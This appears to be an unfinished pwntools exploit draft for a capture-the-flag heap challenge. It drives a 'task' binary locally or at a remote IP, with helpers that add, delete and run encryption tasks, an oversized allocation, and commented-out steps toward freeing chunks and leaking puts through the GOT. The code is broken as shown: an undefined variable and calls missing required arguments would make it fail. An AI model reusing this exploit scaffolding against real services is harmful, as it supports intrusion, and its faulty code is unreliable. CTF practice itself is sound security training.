from pwn import *

is_remote = 0
# is_remote = 1

load_loca_so = 0
# load_loca_so = 1

is_debug = 1
is_debug = 0

remote_addr = "111.186.63.201"
remote_port = 10001

binary_path = "task"

local_libc32_path = "/lib/i386-linux-gnu/libc.so.6"   # 32 bit
local_libc64_path = "/lib/x86_64-linux-gnu/libc-2.23.so"  # 64 bit
provided_libc_path = "./libc-2.27.so"


elf = ELF(binary_path)

if is_remote:
	p = remote(remote_addr, remote_port)
	libc = ELF(provided_libc_path)
else:
	if arch32:
		context.arch = "i386"
		libc = ELF(local_libc32_path)
	else:
		context.arch = "amd64"
		libc = ELF(local_libc64_path)
	# load local so
	if load_loca_so:
		p = process(binary_path, env={'LD_PRELOAD':provided_libc_path})
	else:
		p = process(binary_path)

if is_debug:
	context.log_level = 'debug'


def log(s,addr):
	print('\033[1;32;40m%20s-->0x%x\033[0m'%(s,addr))

def debug(cmd):
	gdb.attach(p, cmd)
	raw_input("GDb debug......")

# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def add_task(task_id, encrypt_flag, key, IV, data_size, data):
	p.sendline(str(1))
	p.sendlineafter("Task id : ", str(task_id))
	if encrypt_flag:
		p.sendlineafter("Encrypt(1) / Decrypt(2): ", str(1))
	else:
		p.sendlineafter("Encrypt(1) / Decrypt(2): ", str(2))
	p.sendafter("Key : ", key)
	p.sendafter("IV : ", IV)
	p.sendlineafter("Data Size : ", str(data_size))
	p.sendafter("Data : ", data)
	p.recvuntil("Choice: ")

def delete_task(task_id):
	p.sendline(str(2))
	p.sendlineafter("Task id : ", str(task_id))
	p.recvuntil("Choice: ")


def go(task_id):
	p.sendline(str(3))
	p.sendlineafter("Task id : ", str(task_id))
	print(p.recvall())

	

def hack():
	p.recvuntil("Choice: ")


	add_task(1, 1, 'a'*32, 'b'*16, 0x1020, 'c'*0x1020)
	go()
	debug()
	# add_task(2, 1, 'd'*32, 'e'*16, 0x100, 'f'*0x100)
	# add_task(3, 1, 'd'*32, 'e'*16, 0x100, 'f'*0x100)
	# debug()
	# delete_task(1)
	# # debug()
	# delete_task(2)
	# # debug()
	# puts_got = elf.got['puts']
	# # payload = p64(puts_got) + '\n'
	# add_task(4, 1, 'g'*32, 'h'*16, 0x70, 'i'*0x70)
	# debug()



if __name__ == '__main__':
	hack()
	p.interactive()



# 0x555555554000

# 0x5555555553c3   add_task malloc

# 0x555555554000 + 0x202028 = 0x555555756028  bss

# 0x555555555693   go read 

# 0x555555555458 delete_task